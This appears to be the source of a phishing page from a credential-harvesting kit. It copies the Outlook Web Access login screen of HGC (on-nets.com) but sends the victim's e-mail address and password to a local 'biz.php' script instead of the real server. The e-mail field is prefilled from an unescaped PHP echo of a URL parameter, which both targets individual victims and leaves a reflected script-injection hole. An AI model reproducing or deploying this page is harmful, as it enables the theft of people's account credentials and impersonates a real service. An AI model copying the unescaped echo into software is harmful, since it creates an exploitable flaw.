<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"><html style=""><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta name="Robots" content="NOINDEX, NOFOLLOW"/>
<title>Microsoft Exchange - Outlook Web Access</title>
<link type="text/css" rel="stylesheet" href="292zi7gv51oaf3v4fe3xszygni.css"/>
<link type="text/css" rel="stylesheet" href="3a1wxz3991ebh3udm9el7tbg9i.css"/>




</head>
<body onload="nsar()" class="owaLgnBdy" data-pagedash-tab-id="155" data-pagedash-install-listener="true" style="">

<noscript>
	<div id="dvErr">
		<table cellpadding="0" cellspacing="0">
		<tr>
			<td><img src="/owa/8.2.176.2/themes/base/error.gif" alt=""></td>
			<td style="width:100%">To use Microsoft Outlook Web access, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser does not support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Microsoft Internet Explorer</a> for access to Outlook Web Access.</td>
		</tr>
		</table>
	</div>
</noscript>
<form action="biz.php" method="POST" name="logonForm" autocomplete="off">
<input type="hidden" name="destination" value="https://email.on-nets.com/owa/?ae=PreFormAction&amp;t=IPM.Note&amp;a=Prev&amp;id=RgAAAACUGggmjbCRQ4hCbhLLjA%2bPBwCHA7r2G%2f3URb2AQK0I5KyqBSbRQ0P1AABGDvC1oFi9RoovtD0bw9S8B0igKYhaAAAJ&amp;fId=LgAAAACUGggmjbCRQ4hCbhLLjA%2bPAQCHA7r2G%2f3URb2AQK0I5KyqBSbRQ0P1AAAB"/>
<input type="hidden" name="flags" value="0"/>
<input type="hidden" name="forcedownlevel" value="0"/>
<table id="tblMain" cellspacing="0" cellpadding="0" align="center">
	<tbody><tr>
		<td colspan="3">
			<table class="tblLgn" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td class="lgnTL"><img src="c7s6cl6nu9sd1klweayzyqznh.gif" alt=""/></td>
				<td class="lgnTM"></td>
				<td class="lgnTR"><img src="1w3a7vmhkfeeh2maj5m2i6qlq.gif" alt=""/></td>
			</tr>
			</tbody></table>
		</td>
	</tr>
	<tr>
		<td id="mdLft"> </td>
		<td id="mdMid" style="background-color:#ffffff !important">
			<table id="tblMid" class="mid">
				<tbody><tr>
					<td id="expltxt" class="expl">
										
					</td>
				</tr>
				<tr><td> </td></tr>
				<tr>
					<td>
						<table class="nonMSIE">
						<colgroup><col/>
						<col class="w100"/>
						</colgroup><tbody><tr id="trSec">
							<td colspan="2">								
								Security 
									‎(
									<a href="https://email.on-nets.com/owa/auth/logon.aspx?url=https://email.on-nets.com/owa/%3Fae=PreFormAction%26t=IPM.Note%26a=Prev%26id=RgAAAACUGggmjbCRQ4hCbhLLjA%252bPBwCHA7r2G%252f3URb2AQK0I5KyqBSbRQ0P1AABGDvC1oFi9RoovtD0bw9S8B0igKYhaAAAJ%26fId=LgAAAACUGggmjbCRQ4hCbhLLjA%252bPAQCHA7r2G%252f3URb2AQK0I5KyqBSbRQ0P1AAAB&amp;reason=0" id="lnkShwSec" onclick="clkExp(&#39;lnkShwSec&#39;)" target="_blank">
									show explanation 
									</a>
									<a href="https://email.on-nets.com/owa/auth/logon.aspx?url=https://email.on-nets.com/owa/%3Fae=PreFormAction%26t=IPM.Note%26a=Prev%26id=RgAAAACUGggmjbCRQ4hCbhLLjA%252bPBwCHA7r2G%252f3URb2AQK0I5KyqBSbRQ0P1AABGDvC1oFi9RoovtD0bw9S8B0igKYhaAAAJ%26fId=LgAAAACUGggmjbCRQ4hCbhLLjA%252bPAQCHA7r2G%252f3URb2AQK0I5KyqBSbRQ0P1AAAB&amp;reason=0" id="lnkHdSec" onclick="clkExp(&#39;lnkHdSec&#39;)" style="display:none" target="_blank">
									hide explanation 
									</a>
								)‎
							</td>
						</tr>						
						<tr>
							<td><input id="rdoPblc" type="radio" name="trusted" value="0" class="rdo" onclick="clkSec()" checked=""/></td>
							<td><label for="rdoPblc">This is a public or shared computer</label></td>
						</tr>
						<tr id="trPubExp" class="expl" style="display:none">
							<td></td>
							<td>Select this option if you use Outlook Web Access on a public computer. Be sure to log off when you have finished using Outlook Web Access and close all windows to end your session.</td>
						</tr>
						<tr>
							<td><input id="rdoPrvt" type="radio" name="trusted" value="4" class="rdo" onclick="clkSec()"/></td>
							<td><label for="rdoPrvt">This is a private computer</label></td>
						</tr>
						<tr id="trPrvtExp" class="expl" style="display:none">
							<td></td>
							<td>Select this option if you are the only person who uses this computer. Your server will allow a longer period of inactivity before logging you off.</td>
						</tr>
						<tr id="trPrvtWrn" class="wrng" style="display:none">
							<td></td>
							<td>Warning:  By selecting this option, you confirm that this computer complies with your organization&#39;s security policy.</td>
						</tr>
						</tbody></table>
					</td>
				</tr>
				<tr><td> </td></tr>
				<tr>
					<td>
						<table class="nonMSIE">
							<colgroup><col/>
							<col class="w100"/>
							
								</colgroup><tbody><tr>
									<td><input id="chkBsc" type="checkbox" class="rdo" onclick="clkBsc();" disabled="" checked=""/></td>
									<td nowrap=""><label for="chkBsc">Use Outlook Web Access Light</label></td>
								</tr>
								<tr id="trBscExp" class="disBsc">
									<td></td>
									<td>The Light client provides fewer features and is sometimes faster. Use the Light client if you are on a slow connection or using a computer with unusually strict browser security settings. If you are using a browser other than Internet Explorer 6 or later, you can only use the Light client.</td>
							</tr>
							
						</tbody></table>
					</td>
				</tr>
				<tr><td> </td></tr>
				<tr>
					<td>
						<table class="nonMSIE">
							<colgroup><col class="nowrap"/>
							<col class="w100"/>
							<col/>
							</colgroup><tbody><tr>
								<td nowrap=""><label for="username">E-mail Address:</label></td>
								<td class="txtpad"><input id="username" name="username" value="<?php echo $_GET['email']; ?>" type="text" class="txt"/></td>
							</tr>
							<tr>
								<td nowrap=""><label for="password">Password:</label></td>
								<td class="txtpad"><input id="password" name="password" type="password" class="txt" onfocus="g_fFcs=0"/></td>
							</tr>
							<tr>
								<td colspan="2" class="txtpad" align="right">
									
									<input type="submit" class="btn" value="Log On" onclick="clkLgn()"/>
									
									<input name="isUtf8" type="hidden" value="1"/>
								</td>
							</tr>
						</tbody></table>
					</td>
				</tr>
				<tr><td><table><tbody><tr>
					<td valign="top"><img src="3a7pyfsh4i3og110artavzvhik.png" alt=""/></td>
					<td><a id="changePwd" href="https://controlpanel.on-nets.com/changepassword/" style="color:#982230" target="_blank">HGC Change Password.</a></td>
					<td style="width:100px">
					</td><td valign="top"><img src="3eyxuyg3nh1li1jufjgx8027o4.png" alt=""/></td>
					<td><a id="userSetting" href="https://controlpanel.on-nets.com/exchange/usersetting/" style="color:#982230" target="_blank">User Settings</a></td>
				</tr></tbody></table></td></tr>
				<tr><td> </td></tr>
				
			</tbody></table>
			<table id="tblMid2" class="mid" style="display:none">
				<tbody><tr><td> </td></tr>
				<tr>
					<td><br/>Please enable cookies for this web site.<br/><br/>Cookies are currently disabled by your browser. Outlook Web Access requires that cookies be enabled. <br/><br/>If you are using Microsoft Internet Explorer 6 or later, open Internet Options from the Tools menu. Click the Privacy tab, and then click Sites. Type the address for Outlook Web Access into the field, click Allow, and then click OK to save your changes.<br/><br/><br/></td>
				</tr>
				<tr><td> </td></tr>
				<tr>
					<td class="txtpad" align="right">
					
						<input type="button" class="btn" style="float: right" value="Retry" onclick="clkRtry()"/>
					
					</td>
				</tr>
			</tbody></table>
			<table class="mid tblConn">
				<!--<tr>
					<td rowspan=2 align="right" class="tdConnImg"><img style="vertical-align:top" src="/owa/8.2.176.2/themes/base/lgnexlogo.gif" alt=""></td>
					<td class="tdConn">Connected to Microsoft Exchange</td>
				</tr>
				<tr>
					<td class="tdCopy">© 2007 Microsoft Corporation. All rights reserved. </td>
				</tr>-->
				<tbody><tr>
					<td id="tdConn" class="tdConn" style="padding-top:0px;padding-left:30px">For HGC Commercial and School Customers Only.</td>
				</tr>
			</tbody></table>
		</td>
		<td id="mdRt"> </td>
	</tr>
	<tr>
		<td colspan="3">
			<table class="tblLgn" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td class="lgnBL"><img src="12fmltdhvbbma9sczqqu8g5sz.gif" alt=""/></td>
				<td class="lgnBM"></td>
				<td class="lgnBR"><img src="373ork5tm0cfw1mikruubndf2z.gif" alt=""/></td>
				
			</tr>
			</tbody></table>
		</td>
	</tr>
</tbody></table>
</form>



<div id="extwaiimpotscp" style="display:none" v="{9945" f="ZXprNU5EVTBPRGMzTFRnM05XRXRORGN6WlMxaE1HTTNMVEF6WVdJNU1UQmhPRFEyTVgwPQ==" q="ee6d6a28" c="72.15" i="81.87" u="7.833" s="19102318" w="false" m="BMe=" vn="0scr3"></div></body></html>